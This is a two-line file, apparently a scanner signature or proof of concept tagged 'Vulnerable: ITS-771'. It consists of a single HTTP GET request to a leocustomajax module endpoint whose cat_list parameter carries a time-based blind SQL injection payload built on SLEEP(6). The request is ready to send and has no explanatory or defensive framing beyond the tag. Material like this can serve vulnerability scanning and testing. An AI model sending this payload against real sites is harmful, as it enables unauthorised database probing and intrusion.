# Vulnerable: ITS-771
GET /modules/leocustomajax/leoajax.php?cat_list=(SELECT(0)FROM(SELECT(SLEEP(6)))a)
